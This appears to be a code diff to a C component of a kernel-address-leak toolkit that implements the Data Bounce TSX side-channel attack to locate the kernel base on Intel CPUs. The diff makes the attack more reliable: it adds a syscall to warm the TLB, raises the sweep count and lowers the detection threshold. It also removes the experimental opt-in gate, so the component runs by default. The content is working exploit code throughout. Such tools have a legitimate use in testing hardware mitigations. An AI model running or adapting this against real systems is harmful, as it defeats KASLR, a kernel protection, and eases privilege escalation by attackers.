@@ -12,8 +12,8 @@
 //
 // Unlike EchoLoad (which relies on Meltdown zero-return behavior), Data
 // Bounce relies on store-to-load forwarding within TSX, which is a
-// separate microarchitectural path. Data Bounce was found to be reliable
-// in every tested configuration (bare metal and VMs, KPTI on and off).
+// separate microarchitectural path. Data Bounce is generally reliable but
+// occasionally returns no result (~5-15% of runs) due to TLB cold state.
 //
 // TSX (RTM) is required — the transient store must occur inside an
 // xbegin/xabort window. Signal handler and speculation modes cannot
@@ -60,6 +60,8 @@
 #include <memory.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/syscall.h>
+#include <unistd.h>
 
 /* =========================================================================
  * Configuration
@@ -71,8 +73,11 @@
 #define DATABOUNCE_REPS 10
 
 /* Total number of independent sweeps. The most frequently returned
- * non-zero address wins if it appears in a majority of sweeps. */
-#define DATABOUNCE_SWEEPS 7
+ * non-zero address wins if it appears in at least DATABOUNCE_SWEEPS/4
+ * sweeps (a low bar since false positives are essentially zero).
+ * Each sweep exits early on the first hit (<3 ms on typical hardware),
+ * so 101 sweeps costs ~300 ms — negligible against the 30 s timeout. */
+#define DATABOUNCE_SWEEPS 101
 
 /* Scan window: uses kasld.h defines (KERNEL_BASE_MIN, KERNEL_BASE_MAX). */
 #define SCAN_STEP (KERNEL_ALIGN)
@@ -95,7 +100,6 @@ KASLD_EXPLAIN(
 
 KASLD_META("method:timing\n"
            "addr:virtual\n"
-           "status:experimental\n"
            "hardware:TSX required (mitigated by tsx=off)\n");
 
 /* =========================================================================
@@ -127,6 +131,13 @@ static unsigned long databounce_sweep(void) {
   volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;
 
   for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
+    /* A syscall immediately before each slot's probes brings __entry_text_start
+     * (or _stext without KPTI) into the TLB. KVM TLB shootdowns can evict
+     * it between slots; a TSX store to a TLB-cold address causes a TLB miss
+     * that aborts the transaction before the store buffer entry is created,
+     * so no forwarding occurs and the whole slot fails. TSX aborts do not
+     * refill the TLB, making all DATABOUNCE_REPS fail in lockstep. */
+    syscall(SYS_getuid);
     for (int rep = 0; rep < DATABOUNCE_REPS; rep++) {
       if (xbegin_wrapper() == ~0u) {
         maccess(0);
@@ -152,12 +163,6 @@ static unsigned long databounce_sweep(void) {
  * =========================================================================
  */
 int main(void) {
-  if (!getenv("KASLD_EXPERIMENTAL")) {
-    fprintf(stderr, "[-] databounce: experimental component; "
-                    "set KASLD_EXPERIMENTAL=1 to enable\n");
-    return KASLD_EXIT_UNAVAILABLE;
-  }
-
   if (!is_intel_cpu()) {
     fprintf(stderr,
             "[-] databounce: not an Intel CPU; attack not applicable\n");
@@ -204,7 +209,7 @@ int main(void) {
     }
   }
 
-  if (!addr || best_count < (DATABOUNCE_SWEEPS + 1) / 2) {
+  if (!addr || best_count < DATABOUNCE_SWEEPS / 4) {
     fprintf(stderr, "[-] databounce: no kernel mapping detected "
                     "(CPU may not be vulnerable)\n");
     return 0;
